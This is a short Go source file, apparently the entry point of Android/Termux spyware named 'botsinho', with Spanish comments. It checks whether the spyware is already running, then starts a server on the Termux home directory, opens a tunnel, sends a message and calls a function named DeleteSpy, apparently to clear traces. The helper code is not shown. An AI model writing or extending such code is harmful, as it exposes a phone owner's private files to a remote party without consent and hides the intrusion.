package main

import (
	"botsinho/utils"
	"botsinho/utils/config"
	"embed"
	"fmt"
	"time"
	//"fmt"
)



func main(){
	
	
	
	run, dat, cant:= config.IsRunSpyware()
	fmt.Println("INICIANDO")
	fmt.Println(cant)
	fmt.Println(dat)
	fmt.Println(run)
	
	
	if(run){
		fmt.Println("El script ya esta corriendo v")
	}else{
		if (config.ConfigTrmx()){
			
			fmt.Println("paso filtro de runner, el script no esta corriendo")
			Init()
			
		}
	}
	
	
	
}

var content embed.FS
func Init(){
	//termux > /data/data/com.termux/files/home
	go utils.ServerInit("/data/data/com.termux/files/home")
	go utils.InitTunnel()
	
	time.Sleep(10*time.Second)
	utils.Send("As")
	//fmt.Println("siuuuuu")
	config.DeleteSpy()
	select{}
	

	
}



